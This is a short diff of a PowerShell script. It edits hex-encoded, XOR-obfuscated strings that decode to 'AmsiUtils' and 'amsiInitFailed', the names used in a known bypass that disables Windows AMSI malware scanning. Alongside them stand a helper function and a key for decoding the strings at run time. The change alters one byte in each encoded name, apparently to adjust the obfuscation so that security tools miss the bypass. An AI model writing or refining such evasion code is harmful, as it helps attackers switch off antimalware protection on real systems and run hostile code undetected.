@@ -22,8 +22,8 @@ $xK = "1246hhjjjkkgdddd"
 function HToS ($hxarr) {
     return ($hxarr -split ' ' | ForEach-Object { [char][convert]::ToInt16($_, 16) }) -join ''
 }
-$originalAdditionalNamex = "41 6D 73 69 55 74 69 6C 73"
-$originalFieldNameH = "61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64"
+$originalAdditionalNamex = "41 6D 73 69 55 74 69 6C 70"
+$originalFieldNameH = "61 6D 73 69 49 6E 69 74 46 61 69 6C 65 60"
 
 $additionalNameHex = X-HxStr -hxStri $originalAdditionalNamex -key $xK
 $fieldNameHex = X-HxStr -hxStri $originalFieldNameH -key $xK
